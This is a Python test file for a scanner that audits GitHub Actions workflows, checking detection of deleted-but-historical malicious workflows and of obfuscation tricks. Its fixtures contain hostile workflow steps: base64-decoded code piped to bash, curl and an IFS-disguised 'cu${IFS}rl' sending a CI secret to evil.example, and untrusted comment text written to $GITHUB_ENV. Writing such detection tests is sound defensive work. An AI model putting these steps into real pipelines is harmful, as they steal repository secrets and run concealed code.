"""Golden end-to-end tests: deletion-not-erasure (WF-HIST-001) + evasion regressions.

These tests confirm the integrated scan() pipeline correctly detects:
  1. Malicious pipelines that were deleted from the working tree but remain in git history.
  2. Four common obfuscation / evasion techniques that rule-matching must pierce.
"""
import subprocess
import tempfile
from pathlib import Path

from credence.workflow_audit.scan import scan


def _git(repo, *a):
    subprocess.run(["git", "-C", str(repo), *a], check=True, capture_output=True, text=True)


MAL = ("on: workflow_dispatch\njobs:\n  b:\n    runs-on: x\n    env:\n      T: ${{ secrets.PROD }}\n"
       "    steps:\n      - run: echo data | base64 -d | bash\n"
       "      - run: curl -d \"$T\" https://evil.example\n")


def test_golden_deletion_does_not_erase_history(tmp_path):
    """Deleting a malicious workflow from git must not suppress WF-HIST-001 findings."""
    _git(tmp_path, "init", "-q")
    _git(tmp_path, "config", "user.email", "d@e.com")
    _git(tmp_path, "config", "user.name", "Dev")
    p = tmp_path / ".github/workflows/staging.yml"
    p.parent.mkdir(parents=True)
    p.write_text(MAL)
    _git(tmp_path, "add", "-A")
    _git(tmp_path, "commit", "-q", "-m", "add")
    _git(tmp_path, "rm", "-q", ".github/workflows/staging.yml")
    _git(tmp_path, "commit", "-q", "-m", "delete it")

    findings = scan(tmp_path, history=True)
    ids = {f["rule_id"] for f in findings}
    assert "WF-HIST-001" in ids, f"WF-HIST-001 not found; got {ids}"
    hist = [f for f in findings if f["rule_id"] == "WF-HIST-001"][0]
    assert hist["persists_in_history_only"] is True


def test_evasion_regressions_each_fire():
    """Each obfuscation pattern must be detected by the expected rule.

    cross_step:    base64-decode written to a file in step N, executed in step N+1
    interp_decode: python3 -c "$(echo x | base64 -d)" interpreter-decode
    ifs_obf:       cu${IFS}rl IFS word-splitting conceals the curl tool name
    github_env:    untrusted event data written to $GITHUB_ENV (injection sink)
    """
    cases = {
        "cross_step": (
            "on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n"
            "      - run: echo x | base64 -d > /tmp/p.sh\n"
            "      - run: bash /tmp/p.sh\n",
            "WF-EXEC-001",
        ),
        "interp_decode": (
            "on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n"
            "      - run: python3 -c \"$(echo x | base64 -d)\"\n",
            "WF-EXEC-001",
        ),
        "ifs_obf": (
            "on: push\njobs:\n  b:\n    runs-on: x\n    env:\n      T: ${{ secrets.P }}\n"
            "    steps:\n      - run: cu${IFS}rl -d \"$T\" https://evil.example\n",
            "WF-EXFIL-001",
        ),
        "github_env": (
            "on: issue_comment\njobs:\n  b:\n    runs-on: x\n    steps:\n"
            "      - run: echo \"X=${{ github.event.comment.body }}\" >> $GITHUB_ENV\n",
            "WF-INJ-002",
        ),
    }
    for name, (content, rule) in cases.items():
        with tempfile.TemporaryDirectory() as d:
            wf = Path(d) / ".github/workflows/c.yml"
            wf.parent.mkdir(parents=True)
            wf.write_text(content)
            ids = {f["rule_id"] for f in scan(d, history=False)}
            assert rule in ids, f"{name}: expected {rule}, got {ids}"
